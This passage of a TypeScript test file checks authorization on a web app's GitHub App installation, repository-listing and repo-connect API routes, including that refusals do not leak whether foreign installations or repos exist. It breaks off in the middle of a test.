/**
 * Phase 3c-1 Task 4 — GitHub App discovery routes (`GET
 * /github/installations`, `GET /github/installations/:id/repos`) and the
 * connect/disconnect routes (`PUT`/`DELETE /projects/:id/repo`). Follows
 * `members-routes.test.ts`'s pattern: fresh `InMemoryStorage` +
 * `createApp` per test, a local `signInAs` minting a cookie via
 * `signSessionId`, `loadConfig({...})` as the config factory.
 */
import { generateKeyPairSync } from "node:crypto"
import express from "express"
import request from "supertest"
import { beforeEach, describe, expect, it, vi } from "vitest"
import { InMemoryStorage } from "../../storage/in-memory-storage"
import { createApp } from "../../__tests__/test-app"
import { loadConfig } from "../../config"
import type { AssetStore } from "../../assets/types"
import { generateMachineToken } from "../../auth/machine-token"
import { signSessionId } from "../../auth/session-cookie"
import { createFakeGitHubAppClient } from "../../github/fake-github-app-client"
import { createSwappableApp } from "../../__tests__/swappable-app"
import { tmpViewerDataDir } from "../../__tests__/test-config"
import type { Installation, Repo } from "../../github/types"
import type { MachineTokenScope, User, UserInstallationEntry } from "../../storage/types"
import { testGithubRuntime } from "../../__tests__/test-github-runtime"
import { upsertTestUser } from "../../__tests__/user-fixtures"
import type { InstanceRole } from "../../storage/types"

const nullAssets: AssetStore = {
  async put() {},
  async get() {
    return null
  },
  async deleteDeployment() {},
}

function authedConfig() {
  return loadConfig({
    VIEWER_ADMIN_TOKEN: "secret",
    VIEWER_GITHUB_CLIENT_ID: "client-id",
    VIEWER_GITHUB_CLIENT_SECRET: "client-secret",
    VIEWER_SESSION_SECRET: "sesh-secret",
    VIEWER_PUBLIC_URL: "http://localhost:3100",
    VIEWER_DATA_DIR: tmpViewerDataDir(),
  })
}

const adminAuth = { Authorization: "Bearer secret" }

const INSTALLATION: Installation = { id: 42, accountLogin: "acme", htmlUrl: "https://github.com/settings/installations/42" }
/**
 * A SECOND installation the App genuinely has, belonging to someone else.
 * Phase 3c-1b's whole point: a signed-in caller who cannot see this one must
 * not learn it exists, must not see `globex/secret` in any list, and must
 * not be able to attach it — and the refusal must be indistinguishable from
 * `OTHER_APP_INSTALLATION_ID` below, which exists nowhere at all.
 */
const FOREIGN_INSTALLATION: Installation = { id: 77, accountLogin: "globex", htmlUrl: "https://github.com/settings/installations/77" }
const OTHER_APP_INSTALLATION_ID = 999 // never present in `installations` below — the "forged id" case
const REPO: Repo = {
  id: 1,
  owner: "acme",
  name: "widget",
  fullName: "acme/widget",
  private: false,
  defaultBranch: "main",
}
const FOREIGN_REPO: Repo = {
  id: 2,
  owner: "globex",
  name: "secret",
  fullName: "globex/secret",
  private: true,
  defaultBranch: "main",
}

const VALID_REPO_BODY = {
  installationId: INSTALLATION.id,
  owner: REPO.owner,
  name: REPO.name,
  branch: "main",
  installCommand: "npm ci",
  buildCommand: "npm run build",
  outputDir: "dist",
  autoDeploy: true,
}

describe("GitHub connect/disconnect API (Phase 3c-1 Task 4)", () => {
  let storage: InMemoryStorage
  let app: express.Express
  const config = authedConfig()

  /**
   * ONE stable app object for this whole file. Every `request()` below
   * receives it, so `supertest-reuse` opens a single server here instead of
   * one per constructed app — this file was the suite's largest source of
   * ephemeral-port churn at 81 servers per run. See `__tests__/swappable-app.ts`.
   *
   * Safe to share because no test in this file uses two apps at once: the
   * tests that request against `app` (the no-githubApp build) never call
   * `appWithGithub()`, and every test that does call it uses only what it
   * returns. `beforeEach` reinstalls the plain app before each test, so the
   * two never bleed across.
   */
  const stable = createSwappableApp()

  beforeEach(() => {
    storage = new InMemoryStorage()
    stable.use(createApp({ storage, assets: nullAssets, config, bridgeScript: "// bridge", github: testGithubRuntime() }))
    app = stable.app
  })

  /**
   * Seeds a user + live session in `storage`, returns a `Cookie` header
   * value for it.
   *
   * Phase 3c-1b: also records the GitHub App installations that user can
   * see, AND (security audit B4) the repos WITHIN each installation that
   * user can personally reach — exactly as the real OAuth callback does.
   * Without it a caller is authorized for NOTHING, which is the whole
   * point of the change: `PUT /projects/:id/repo` filters the
   * installation's repo list through the caller's own `repoFullNames`
   * (`filterReposForCaller`), so a caller with no entry for a repo can
   * never connect it even though the installation itself grants it.
   *
   * The default (one entry for `INSTALLATION`, carrying `REPO.fullName`)
   * makes every pre-B4 test read as "a caller who legitimately has this
   * installation and this repo"; passing an explicit list — `[]`, an entry
   * for `FOREIGN_INSTALLATION`, or an entry missing the repo the test is
   * about to try to connect — is how the cross-user tests below build a
   * caller who cannot.
   */
  async function signInAs(
    email: string,
    installations: UserInstallationEntry[] = [
      { installationId: INSTALLATION.id, repoFullNames: [REPO.fullName] },
    ],
    role: InstanceRole = "editor",
  ) {
    const user = await upsertTestUser(storage, {
      provider: "github",
      providerUserId: email,
      email,
      displayName: email,
      avatarUrl: "",
      role,
    })
    await storage.setUserInstallations(user.id, installations, new Date().toISOString())
    const session = await storage.createSession({
      userId: user.id,
      expiresAt: new Date(Date.now() + 60_000).toISOString(),
    })
    const cookie = `viewer_session=${signSessionId(config.sessionSecret, session.id)}`
    return { user, cookie }
  }

  /** Mints a live machine token directly in storage and returns its bearer header value. */
  async function patFor(user: User, scopes: MachineTokenScope[]): Promise<string> {
    const gen = generateMachineToken()
    await storage.createMachineToken({
      id: gen.id,
      userId: user.id,
      name: "seeded",
      scopes,
      tokenHash: gen.tokenHash,
      expiresAt: null,
    })
    return `Bearer ${gen.token}`
  }

  function appWithGithub(filesByRepo?: Record<string, string | null>) {
    const githubApp = createFakeGitHubAppClient({
      installations: [INSTALLATION, FOREIGN_INSTALLATION],
      reposByInstallation: {
        [INSTALLATION.id]: [REPO],
        [FOREIGN_INSTALLATION.id]: [FOREIGN_REPO],
      },
      branchesByRepo: {
        [REPO.fullName]: ["main", "feat/new-nav"],
        [FOREIGN_REPO.fullName]: ["main", "globex-secret-branch"],
      },
      ...(filesByRepo ? { filesByRepo } : {}),
    })
    // Installed into the same stable object `beforeEach` uses, and returned as
    // that object — so the 35 tests calling this share one server rather than
    // opening one apiece (and `expectRejected` below calls it up to 4x per test).
    // The fake client is INJECTED into the runtime now — `config.githubApp`
    // no longer decides whether the connect routes answer, the live
    // `github.appClient` does (see `github-runtime.ts`), so an override is
    // the only way to turn them on without real credentials.
    stable.use(
      createApp({
        storage,
        assets: nullAssets,
        config,
        bridgeScript: "// bridge",
        github: testGithubRuntime({ overrides: { appClient: githubApp } }),
      }),
    )
    return stable.app
  }

  /** `.desde/config.json` at the repo the VALID_REPO_BODY connects. */
  const CONFIG_KEY = "acme/widget:.desde/config.json"

  describe("GET /github/installations — unconfigured App", () => {
    it("200s with configured:false and an empty list — never a 500, never signed-in-gated", async () => {
      const res = await request(app).get("/api/v1/github/installations").expect(200)
      expect(res.body).toEqual({ configured: false, appSlug: null, installations: [] })
    })

    it("also 200s configured:false for a signed-in caller — the flag, not auth state, tells this story", async () => {
      const { cookie } = await signInAs("someone@x.com")
      const res = await request(app).get("/api/v1/github/installations").set("Cookie", cookie).expect(200)
      expect(res.body).toEqual({ configured: false, appSlug: null, installations: [] })
    })
  })

  /**
   * `appSlug` and the installations in the same response describe the SAME
   * App, and the handler reads them at different times — the client up front,
   * the slug when it builds the body, two awaits later. The runtime's fields
   * are mutable by design (`github-runtime.ts`), so a reload landing in
   * between would pair the NEW App's slug with the OLD client's data, and the
   * UI would send the user to install an App that has nothing to do with the
   * list it is showing.
   *
   * Reproduced by reloading the runtime from INSIDE a storage call the
   * handler awaits, which is the only place a reload can realistically land
   * mid-request.
   */
  it("pairs appSlug with the client that produced the data, even if a reload lands mid-request", async () => {
    const { privateKey } = generateKeyPairSync("rsa", {
      modulusLength: 2048,
      privateKeyEncoding: { type: "pkcs8", format: "pem" },
      publicKeyEncoding: { type: "spki", format: "pem" },
    })
    function configWithSlug(slug: string) {
      return loadConfig({
        VIEWER_SESSION_SECRET: "sesh-secret",
        VIEWER_PUBLIC_URL: "http://localhost:3100",
        VIEWER_GITHUB_APP_ID: "111",
        VIEWER_GITHUB_APP_PRIVATE_KEY: privateKey as string,
        VIEWER_GITHUB_APP_SLUG: slug,
        VIEWER_DATA_DIR: tmpViewerDataDir(),
      })
    }
    const before = configWithSlug("app-before")
    const reloadStorage = new InMemoryStorage()
    const githubApp = createFakeGitHubAppClient({
      installations: [INSTALLATION],
      reposByInstallation: { [INSTALLATION.id]: [REPO] },
    })
    // The client is an override, so it is the SAME object before and after —
    // isolating the slug as the only thing the reload moves.
    const runtime = testGithubRuntime({ config: before, overrides: { appClient: githubApp } })

    const user = await upsertTestUser(reloadStorage, {
      provider: "github",
      providerUserId: "reload@x.com",
      email: "reload@x.com",
      displayName: "R",
      avatarUrl: "",
    })
    await reloadStorage.setUserInstallations(
      user.id,
      [{ installationId: INSTALLATION.id, repoFullNames: [REPO.fullName] }],
      new Date().toISOString(),
    )
    const session = await reloadStorage.createSession({
      userId: user.id,
      expiresAt: new Date(Date.now() + 60_000).toISOString(),
    })
    const cookie = `viewer_session=${signSessionId(before.sessionSecret, session.id)}`

    // The reload fires from inside an await the handler is already sitting on.
    const realGet = reloadStorage.getUserInstallations.bind(reloadStorage)
    reloadStorage.getUserInstallations = async (userId: string) => {
      runtime.reload(configWithSlug("app-after"))
      return realGet(userId)
    }

    stable.use(
      createApp({
        storage: reloadStorage,
        assets: nullAssets,
        config: before,
        bridgeScript: "// bridge",
        github: runtime,
      }),
    )
    const res = await request(stable.app)
      .get("/api/v1/github/installations")
      .set("Cookie", cookie)
      .expect(200)

    // The reload definitely happened...
    expect(runtime.config.githubApp?.slug).toBe("app-after")
    // ...and this response still describes the App it started with.
    expect(res.body.appSlug).toBe("app-before")
    expect(res.body.installations).toEqual([INSTALLATION])
  })

  describe("GET /github/installations/:id/repos — unconfigured App", () => {
    it("200s with configured:false and an empty list", async () => {
      const res = await request(app).get(`/api/v1/github/installations/${INSTALLATION.id}/repos`).expect(200)
      expect(res.body).toEqual({ configured: false, repos: [] })
    })
  })

  describe("GET /github/installations — configured", () => {
    it("401s a signed-out caller", async () => {
      await request(appWithGithub()).get("/api/v1/github/installations").expect(401)
    })

    it("200s a signed-in (cookie) caller with the installations THAT CALLER can see", async () => {
      const built = appWithGithub()
      const { cookie } = await signInAs("someone@x.com")
      const res = await request(built).get("/api/v1/github/installations").set("Cookie", cookie).expect(200)
      expect(res.body).toMatchObject({
        configured: true,
        appSlug: null,
        installations: [INSTALLATION],
        installationsStale: false,
      })
      expect(typeof res.body.installationsSyncedAt).toBe("string")
    })

    it("200s a caller authenticated with a (read-scoped) PAT — a PAT counts as signed in here, unlike /tokens", async () => {
      const built = appWithGithub()
      const { user } = await signInAs("ci@x.com")
      const bearer = await patFor(user, ["read"])
      const res = await request(built)
        .get("/api/v1/github/installations")
        .set("Authorization", bearer)
        .expect(200)
      expect(res.body.configured).toBe(true)
    })

    it("the bare admin bearer (no cookie) does not count as signed in — 401", async () => {
      await request(appWithGithub()).get("/api/v1/github/installations").set(adminAuth).expect(401)
    })
  })

  /**
   * Phase 3c-1b. Before this, `GET /github/installations` returned
   * `listInstallations()` verbatim — the App's ENTIRE inventory — so any
   * GitHub account able to sign in could read every installation and every
   * private repo name the App could reach.
   */
  describe("GET /github/installations — filtered to the caller (Phase 3c-1b)", () => {
    it("omits an installation the caller cannot see, even though the App has it", async () => {
      const built = appWithGithub()
      const { cookie } = await signInAs("acme-person@x.com", [
        { installationId: INSTALLATION.id, repoFullNames: [REPO.fullName] },
      ])
      const res = await request(built).get("/api/v1/github/installations").set("Cookie", cookie).expect(200)
      expect(res.body.installations).toEqual([INSTALLATION])
      expect(res.body.installations).not.toContainEqual(FOREIGN_INSTALLATION)
    })

    it("gives a caller with a captured-but-empty set an empty list that is NOT flagged stale", async () => {
      const built = appWithGithub()
      const { cookie } = await signInAs("nobody@x.com", [])
      const res = await request(built).get("/api/v1/github/installations").set("Cookie", cookie).expect(200)
      expect(res.body.installations).toEqual([])
      // "We asked GitHub, you have none" — the UI should say "install the
      // App", not "sign in again".
      expect(res.body.installationsStale).toBe(false)
    })

    it("flags a caller with NO captured set as stale and authorizes nothing (the pre-3c-1b upgrade case)", async () => {
      const built = appWithGithub()
      // A user row + session with no installation capture — exactly the
      // state of anyone signed in before this phase shipped.
      const user = await upsertTestUser(storage, {
        provider: "github",
        providerUserId: "legacy@x.com",
        email: "legacy@x.com",
        displayName: "Legacy",
        avatarUrl: "",
      })
      const session = await storage.createSession({
        userId: user.id,
        expiresAt: new Date(Date.now() + 60_000).toISOString(),
      })
      const cookie = `viewer_session=${signSessionId(config.sessionSecret, session.id)}`

      const res = await request(built).get("/api/v1/github/installations").set("Cookie", cookie).expect(200)
      expect(res.body.installations).toEqual([])
      expect(res.body.installationsStale).toBe(true)
      expect(res.body.installationsSyncedAt).toBeNull()
    })

    it("filters a PAT caller by ITS OWNING USER's set, not by the App's inventory", async () => {
      const built = appWithGithub()
      const { user } = await signInAs("ci@x.com", [
        { installationId: FOREIGN_INSTALLATION.id, repoFullNames: [FOREIGN_REPO.fullName] },
      ])
      const bearer = await patFor(user, ["read"])
      const res = await request(built)
        .get("/api/v1/github/installations")
        .set("Authorization", bearer)
        .expect(200)
      expect(res.body.installations).toEqual([FOREIGN_INSTALLATION])
    })
  })

  describe("GET /github/installations/:id/repos/:owner/:name/branches", () => {
    const branchesPath = (installationId: number, owner: string, name: string) =>
      `/api/v1/github/installations/${installationId}/repos/${owner}/${name}/branches`

    it("401s a signed-out caller", async () => {
      await request(appWithGithub()).get(branchesPath(INSTALLATION.id, REPO.owner, REPO.name)).expect(401)
    })

    it("400s a non-numeric installation id", async () => {
      const built = appWithGithub()
      const { cookie } = await signInAs("someone@x.com")
      await request(built)
        .get(`/api/v1/github/installations/not-a-number/repos/${REPO.owner}/${REPO.name}/branches`)
        .set("Cookie", cookie)
        .expect(400)
    })

    it("200s the branch names for a repo the caller can see", async () => {
      const built = appWithGithub()
      const { cookie } = await signInAs("someone@x.com")
      const res = await request(built)
        .get(branchesPath(INSTALLATION.id, REPO.owner, REPO.name))
        .set("Cookie", cookie)
        .expect(200)
      expect(res.body).toEqual({ configured: true, branches: ["main", "feat/new-nav"] })
    })

    /**
     * The check that `callerCanSeeInstallation` alone does not make. The
     * caller legitimately sees INSTALLATION, and names a repo that is not in
     * it. Without the membership test this would answer branch names for a
     * repo they have no relationship to, and for a public repo GitHub would
     * happily supply them.
     */
    it("404s a repo that is not in the installation, even for a caller who can see it", async () => {
      const built = appWithGithub()
      const { cookie } = await signInAs("acme-person@x.com", [
        { installationId: INSTALLATION.id, repoFullNames: [REPO.fullName] },
      ])
      const res = await request(built)
        .get(branchesPath(INSTALLATION.id, FOREIGN_REPO.owner, FOREIGN_REPO.name))
        .set("Cookie", cookie)
        .expect(404)
      expect(res.body).toEqual({ error: "Repository not found" })
      expect(res.text).not.toContain("globex-secret-branch")
    })

    /**
     * The two refusals must be indistinguishable, for the same reason the
     * repos route's are: otherwise this is an existence oracle, one probe at
     * a time, over both installations AND repo names.
     */
    it("404s a foreign installation BYTE-IDENTICALLY to one that exists nowhere", async () => {
      const built = appWithGithub()
      const { cookie } = await signInAs("acme-person2@x.com", [
        { installationId: INSTALLATION.id, repoFullNames: [REPO.fullName] },
      ])

      const foreign = await request(built)
        .get(branchesPath(FOREIGN_INSTALLATION.id, FOREIGN_REPO.owner, FOREIGN_REPO.name))
        .set("Cookie", cookie)
      const nonexistent = await request(built)
        .get(branchesPath(OTHER_APP_INSTALLATION_ID, REPO.owner, REPO.name))
        .set("Cookie", cookie)

      expect(foreign.status).toBe(404)
      expect(foreign.status).toBe(nonexistent.status)
      expect(foreign.body).toEqual(nonexistent.body)
      expect(foreign.text).toBe(nonexistent.text)
    })
  })

  describe("GET /github/installations/:id/repos — configured", () => {
    it("401s a signed-out caller", async () => {
      await request(appWithGithub()).get(`/api/v1/github/installations/${INSTALLATION.id}/repos`).expect(401)
    })

    it("400s a non-numeric installation id", async () => {
      const built = appWithGithub()
      const { cookie } = await signInAs("someone@x.com")
      await request(built).get("/api/v1/github/installations/not-a-number/repos").set("Cookie", cookie).expect(400)
    })

    it("404s an installation id the App doesn't have — same shape for any unknown id", async () => {
      const built = appWithGithub()
      const { cookie } = await signInAs("someone@x.com")
      const res = await request(built)
        .get(`/api/v1/github/installations/${OTHER_APP_INSTALLATION_ID}/repos`)
        .set("Cookie", cookie)
        .expect(404)
      expect(res.body).toEqual({ error: "Installation not found" })
    })

    it("200s the repos for an installation the caller can see", async () => {
      const built = appWithGithub()
      const { cookie } = await signInAs("someone@x.com")
      const res = await request(built)
        .get(`/api/v1/github/installations/${INSTALLATION.id}/repos`)
        .set("Cookie", cookie)
        .expect(200)
      expect(res.body).toEqual({ configured: true, repos: [REPO] })
    })

    /**
     * THE test this phase exists for. A user who cannot see an installation
     * must not be able to read its repos, and the refusal must be
     * byte-identical (status AND body) to the refusal for an installation
     * that exists nowhere — otherwise the endpoint is an existence oracle
     * over the App's whole inventory, one probe at a time.
     */
    it("404s an installation the caller cannot see, BYTE-IDENTICALLY to one that doesn't exist at all", async () => {
      const built = appWithGithub()
      const { cookie } = await signInAs("acme-person@x.com", [
        { installationId: INSTALLATION.id, repoFullNames: [REPO.fullName] },
      ])

      const foreign = await request(built)
        .get(`/api/v1/github/installations/${FOREIGN_INSTALLATION.id}/repos`)
        .set("Cookie", cookie)
      const nonexistent = await request(built)
        .get(`/api/v1/github/installations/${OTHER_APP_INSTALLATION_ID}/repos`)
        .set("Cookie", cookie)

      expect(foreign.status).toBe(404)
      expect(foreign.status).toBe(nonexistent.status)
      expect(foreign.body).toEqual(nonexistent.body)
      expect(foreign.text).toBe(nonexistent.text)
      // And nothing about the foreign installation's private repo leaked.
      expect(foreign.text).not.toContain(FOREIGN_REPO.name)
    })

    it("404s every installation for a caller whose set was never captured", async () => {
      const built = appWithGithub()
      const user = await upsertTestUser(storage, {
        provider: "github",
        providerUserId: "legacy2@x.com",
        email: "legacy2@x.com",
        displayName: "Legacy",
        avatarUrl: "",
      })
      const session = await storage.createSession({
        userId: user.id,
        expiresAt: new Date(Date.now() + 60_000).toISOString(),
      })
      const cookie = `viewer_session=${signSessionId(config.sessionSecret, session.id)}`

      await request(built)
        .get(`/api/v1/github/installations/${INSTALLATION.id}/repos`)
        .set("Cookie", cookie)
        .expect(404)
    })
  })

  describe("PUT /projects/:id/repo", () => {
    let slugCounter = 0
    async function seedOwnedProject() {
      // A unique slug per call — several tests in this file call this
      // helper more than once against the SAME `storage` instance (e.g.
      // `expectRejected` invoked several times per `it`), and
      // `createProject` 409s on a repeated slug.
      const project = await storage.createProject({ slug: `acme-proto-${slugCounter++}`, name: "Acme Proto" })
      const { user: owner, cookie: ownerCookie } = await signInAs(`owner-${project.slug}@x.com`)
      await storage.addProjectMember({ projectId: project.id, userId: owner.id })
      return { project, owner, ownerCookie }
    }

    // ---------------------------------------------------------------
    // Embedded-identity adoption at connect time (design spec C3)
    // ---------------------------------------------------------------

    it("adopts the identity the repo already carries", async () => {
      const { project, ownerCookie } = await seedOwnedProject()
      const built = appWithGithub({
        [CONFIG_KEY]: JSON.stringify({
          version: 2,
          project: { id: "emb-1", name: "Acme Widget", slug: "acme-widget" },
        }),
      })
      const res = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", ownerCookie)
        .send(VALID_REPO_BODY)
        .expect(200)
      expect(res.body.embeddedId).toBe("emb-1")
      expect(res.body.identityConflict).toBeUndefined()
    })

    it("connects fine when the repo has NO config — the common case, not an error", async () => {
      const { project, ownerCookie } = await seedOwnedProject()
      const res = await request(appWithGithub())
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", ownerCookie)
        .send(VALID_REPO_BODY)
        .expect(200)
      expect(res.body.embeddedId).toBeNull()
    })

    it("connects fine when the config is malformed JSON", async () => {
      const { project, ownerCookie } = await seedOwnedProject()
      const built = appWithGithub({ [CONFIG_KEY]: "{ not json" })
      const res = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", ownerCookie)
        .send(VALID_REPO_BODY)
        .expect(200)
      expect(res.body.embeddedId).toBeNull()
    })

    it("connects fine when the contents read THROWS", async () => {
      // Network / 5xx / no contents permission must not fail a connect that
      // has otherwise fully succeeded.
      const { project, ownerCookie } = await seedOwnedProject()
      const built = appWithGithub({ [CONFIG_KEY]: null })
      const res = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", ownerCookie)
        .send(VALID_REPO_BODY)
        .expect(200)
      expect(res.body.embeddedId).toBeNull()
    })

    it("reports identityConflict without failing the connect when another project owns the id", async () => {
      const other = await storage.createProject({ slug: "other-proj", name: "Other" })
      await storage.setProjectEmbeddedId(other.id, "emb-1")

      const { project, ownerCookie } = await seedOwnedProject()
      const built = appWithGithub({
        [CONFIG_KEY]: JSON.stringify({
          version: 2,
          project: { id: "emb-1", name: "Acme Widget", slug: "acme-widget" },
        }),
      })
      const res = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", ownerCookie)
        .send(VALID_REPO_BODY)
        .expect(200)
      // The repo IS legitimately connected; which project id owns it is a
      // separate question only the user can settle.
      expect(res.body.embeddedId).toBeNull()
      expect(res.body.identityConflict).toEqual({
        embeddedId: "emb-1",
        conflictWith: other.id,
      })
    })

    it("401s a caller with an unrecognized (garbage) bearer — the one true 401 path through this guard", async () => {
      const { project } = await seedOwnedProject()
      await request(appWithGithub())
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Authorization", "Bearer definitely-not-a-real-token")
        .send(VALID_REPO_BODY)
        .expect(401)
    })

    it("403s (not 401) a truly anonymous (no credential at all) caller on a PUBLICLY readable project — readable but not the owner", async () => {
      const built = appWithGithub()
      const project = await storage.createProject({
        slug: `acme-proto-${slugCounter++}`,
        name: "Public",
        access: "public-link",
      })
      await request(built).put(`/api/v1/projects/${project.id}/repo`).send(VALID_REPO_BODY).expect(403)
    })

    // Under Authorization v2 a membership row grants no authority at all —
    // an EDITOR connects a repo whether or not they hold one. What still
    // refuses is a VIEWER, checked below.
    it("succeeds for a signed-in EDITOR who is not the owner", async () => {
      const built = appWithGithub()
      const { project } = await seedOwnedProject()
      const { user: plainMember, cookie: memberCookie } = await signInAs("member@x.com")
      await storage.addProjectMember({ projectId: project.id, userId: plainMember.id })

      await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", memberCookie)
        .send(VALID_REPO_BODY)
        .expect(200)
    })

    // Authorization v2 boundary: the instance ROLE, not the membership row.
    // An EDITOR with no row is admitted (above); a VIEWER is refused even
    // while holding one.
    it("403s a signed-in VIEWER, membership row or not", async () => {
      const built = appWithGithub()
      const { project } = await seedOwnedProject()
      const { user: reader, cookie: readerCookie } = await signInAs("reader@x.com", undefined, "viewer")
      await storage.addProjectMember({ projectId: project.id, userId: reader.id })

      await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", readerCookie)
        .send(VALID_REPO_BODY)
        .expect(403)
    })

    it("404s an anonymous caller on an unreadable ('invited', has a member) project — byte-identical to a bogus id", async () => {
      const built = appWithGithub()
      const { project } = await seedOwnedProject()
      // `ProjectCreateInput.access` defaults to "all-members", so the
      // project is locked explicitly here — this test is specifically about
      // an anonymous caller on a project they cannot read.
      await storage.updateProject(project.id, { access: "invited" })

      const denied = await request(built).put(`/api/v1/projects/${project.id}/repo`).send(VALID_REPO_BODY)
      const missing = await request(built).put(`/api/v1/projects/nope/repo`).send(VALID_REPO_BODY)
      expect(denied.status).toBe(404)
      expect(denied.status).toBe(missing.status)
      expect(denied.body).toEqual(missing.body)
    })

    it("403s a read-scoped PAT owned by the project's owner — write mutation needs write scope", async () => {
      const built = appWithGithub()
      const { project, owner } = await seedOwnedProject()
      const bearer = await patFor(owner, ["read"])

      const res = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Authorization", bearer)
        .send(VALID_REPO_BODY)
        .expect(403)
      expect(res.body.error).toMatch(/write-scoped/i)
    })

    it("succeeds for a write-scoped PAT owned by the project's owner, and the connect-repo panel can read the result straight back off the project", async () => {
      const built = appWithGithub()
      const { project, owner } = await seedOwnedProject()
      const bearer = await patFor(owner, ["write"])

      const res = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Authorization", bearer)
        .send(VALID_REPO_BODY)
        .expect(200)
      expect(res.body.repoConfig).toEqual({
        installationId: INSTALLATION.id,
        owner: REPO.owner,
        name: REPO.name,
        defaultBranch: REPO.defaultBranch,
        branch: "main",
        installCommand: "npm ci",
        buildCommand: "npm run build",
        outputDir: "dist",
        autoDeploy: true,
      })

      const stored = await storage.getProject(project.id)
      expect(stored?.repoConfig?.owner).toBe(REPO.owner)
    })

    it("succeeds for the admin bearer too, with a session cookie owner also attached", async () => {
      const built = appWithGithub()
      const { project, ownerCookie } = await seedOwnedProject()

      await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set(adminAuth)
        .set("Cookie", ownerCookie)
        .send(VALID_REPO_BODY)
        .expect(200)
    })

    it("400s with 'GitHub App is not configured on this deployment' when unconfigured, even for a legitimate owner", async () => {
      const { project, ownerCookie } = await seedOwnedProject()
      const res = await request(app) // `app`, not `appWithGithub()` — no githubApp injected
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", ownerCookie)
        .send(VALID_REPO_BODY)
        .expect(400)
      expect(res.body.error).toMatch(/not configured/i)
    })

    it("REFUSES a forged installationId (belongs to no installation this App has) without leaking whether it exists", async () => {
      const built = appWithGithub()
      const { project, ownerCookie } = await seedOwnedProject()

      const forged = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", ownerCookie)
        .send({ ...VALID_REPO_BODY, installationId: OTHER_APP_INSTALLATION_ID })
        .expect(400)
      expect(forged.body).toEqual({ error: "Invalid installation" })
      expect((await storage.getProject(project.id))?.repoConfig).toBeNull()

      // A DIFFERENT nonexistent id gets the exact same response — the
      // message can't be used to distinguish "no such id at all" from
      // "exists, just not this one".
      const anotherForged = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", ownerCookie)
        .send({ ...VALID_REPO_BODY, installationId: 123456 })
        .expect(400)
      expect(anotherForged.body).toEqual(forged.body)
    })

    it("refuses when the repo isn't a member of the installation's repo list", async () => {
      const built = appWithGithub()
      const { project, ownerCookie } = await seedOwnedProject()

      const res = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", ownerCookie)
        .send({ ...VALID_REPO_BODY, name: "does-not-exist" })
        .expect(400)
      expect(res.body.error).toMatch(/not found/i)
    })

    /**
     * THE B4 property itself, and the only test that isolates it.
     *
     * Every other refusal above fails at an OLDER gate — the caller can't see
     * the installation, or the repo isn't in the installation's list at all.
     * Those both passed before this security fix. The finding was that neither
     * asks the per-USER question: GitHub grants an INSTALLATION a set of
     * repos, but an individual org member may be denied several of them, so a
     * caller could connect — and therefore clone, build and read — a private
     * repo GitHub itself would refuse them.
     *
     * So this caller is maximally legitimate: a signed-in project OWNER, who
     * CAN see the installation, asking for a repo that IS in that
     * installation's list. The only thing that may refuse them is the
     * intersection with their own captured `repoFullNames`.
     *
     * Without this test the gate is unverified, because `signInAs` now grants
     * the target repo by default — so every other connect test would keep
     * passing if the intersection were deleted tomorrow.
     */
    it("REFUSES a repo the installation has but the CALLER cannot access (B4)", async () => {
      const built = appWithGithub()
      const project = await storage.createProject({ slug: `noentitle-${slugCounter++}`, name: "NoEntitle" })
      const { user: owner, cookie } = await signInAs(`noentitle-${project.slug}@x.com`, [
        // Sees the installation, but their own accessible-repo set does NOT
        // contain the repo they are about to ask for.
        { installationId: INSTALLATION.id, repoFullNames: ["acme/some-other-repo"] },
      ])
      await storage.addProjectMember({ projectId: project.id, userId: owner.id })

      const denied = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", cookie)
        .send(VALID_REPO_BODY)

      expect(denied.status).toBe(400)
      // Nothing was attached — the refusal is real, not cosmetic.
      expect((await storage.getProject(project.id))?.repoConfig).toBeNull()

      // And it must not become an oracle: a repo they cannot access must look
      // exactly like one that does not exist.
      const missing = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", cookie)
        .send({ ...VALID_REPO_BODY, name: "does-not-exist" })
      expect(denied.body).toEqual(missing.body)
      expect(denied.text).toBe(missing.text)
    })

    it("REFUSES when the caller's repo capture FAILED — null authorizes nothing (B4)", async () => {
      // `repoFullNames: null` means the per-user lookup did not complete. An
      // unknown entitlement must take the restrictive branch; treating it as
      // "unrestricted" would reopen B4 for every user whose sign-in raced a
      // GitHub blip, and for every user who signed in before the fix shipped.
      const built = appWithGithub()
      const project = await storage.createProject({ slug: `nullcap-${slugCounter++}`, name: "NullCap" })
      const { user: owner, cookie } = await signInAs(`nullcap-${project.slug}@x.com`, [
        { installationId: INSTALLATION.id, repoFullNames: null },
      ])
      await storage.addProjectMember({ projectId: project.id, userId: owner.id })

      await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", cookie)
        .send(VALID_REPO_BODY)
        .expect(400)
      expect((await storage.getProject(project.id))?.repoConfig).toBeNull()
    })

    /**
     * The attach half of the same finding. A project owner is authorized
     * over THEIR PROJECT; that must not become authority over an
     * installation they cannot see. Note this caller is a legitimate,
     * signed-in project owner with a valid write path — the ONLY thing
     * refusing them is the installation filter.
     */
    it("REFUSES a repo from an installation the caller cannot see, identically to a forged id", async () => {
      const built = appWithGithub()
      const project = await storage.createProject({ slug: `outsider-${slugCounter++}`, name: "Outsider" })
      const { user: owner, cookie } = await signInAs(`outsider-${project.slug}@x.com`, [
        { installationId: INSTALLATION.id, repoFullNames: [REPO.fullName] },
      ])
      await storage.addProjectMember({ projectId: project.id, userId: owner.id })

      const foreign = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
